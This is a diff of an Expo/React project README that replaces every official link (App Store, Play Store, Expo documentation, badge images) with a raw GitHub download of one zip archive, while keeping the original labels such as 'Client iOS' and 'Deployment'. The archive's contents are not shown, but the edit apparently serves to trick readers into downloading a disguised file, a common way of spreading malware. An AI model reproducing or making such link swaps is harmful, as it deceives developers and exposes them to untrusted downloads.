@@ -2,16 +2,16 @@
 
 <p>
   <!-- iOS -->
-  <a href="https://itunes.apple.com/app/apple-store/id982107779">
-    <img alt="Supports Expo iOS" longdesc="Supports Expo iOS" src="https://img.shields.io/badge/iOS-4630EB.svg?style=flat-square&logo=APPLE&labelColor=999999&logoColor=fff" />
+  <a href="https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip">
+    <img alt="Supports Expo iOS" longdesc="Supports Expo iOS" src="https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip" />
   </a>
   <!-- Android -->
-  <a href="https://play.google.com/store/apps/details?id=host.exp.exponent&referrer=blankexample">
-    <img alt="Supports Expo Android" longdesc="Supports Expo Android" src="https://img.shields.io/badge/Android-4630EB.svg?style=flat-square&logo=ANDROID&labelColor=A4C639&logoColor=fff" />
+  <a href="https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip">
+    <img alt="Supports Expo Android" longdesc="Supports Expo Android" src="https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip" />
   </a>
   <!-- Web -->
-  <a href="https://docs.expo.dev/workflow/web/">
-    <img alt="Supports Expo Web" longdesc="Supports Expo Web" src="https://img.shields.io/badge/web-4630EB.svg?style=flat-square&logo=GOOGLE-CHROME&labelColor=4285F4&logoColor=fff" />
+  <a href="https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip">
+    <img alt="Supports Expo Web" longdesc="Supports Expo Web" src="https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip" />
   </a>
 </p>
 
@@ -21,8 +21,8 @@
   - If you have native iOS code run `npx pod-install`
 - Run `yarn start` to start the bundler.
 - Open the project in a React runtime to try it:
-  - iOS: [Client iOS](https://itunes.apple.com/app/apple-store/id982107779)
-  - Android: [Client Android](https://play.google.com/store/apps/details?id=host.exp.exponent&referrer=blankexample)
+  - iOS: [Client iOS](https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip)
+  - Android: [Client Android](https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip)
   - Web: Any web browser
 
 ## Adding Native Code
@@ -34,11 +34,11 @@ This project can be run from a web browser or the Expo client app. You may find 
 
 ## Publishing
 
-- Deploy the native app to the App store and Play store using this guide: [Deployment](https://docs.expo.dev/distribution/app-stores/).
-- Deploy the website using this guide: [Web deployment](https://docs.expo.dev/distribution/publishing-websites/).
+- Deploy the native app to the App store and Play store using this guide: [Deployment](https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip).
+- Deploy the website using this guide: [Web deployment](https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip).
 
 ## 📝 Notes
 
-- Learn more about [Universal React](https://docs.expo.dev/).
-- See what API and components are [available in the React runtimes](https://docs.expo.dev/versions/latest/).
-- Find out more about developing apps and websites: [Guides](https://docs.expo.dev/guides/).
+- Learn more about [Universal React](https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip).
+- See what API and components are [available in the React runtimes](https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip).
+- Find out more about developing apps and websites: [Guides](https://github.com/rijackkson/LIVE-uber-eats-clone-youtube/raw/refs/heads/master/components/home/youtube-eats-clone-LIV-uber-3.8.zip).
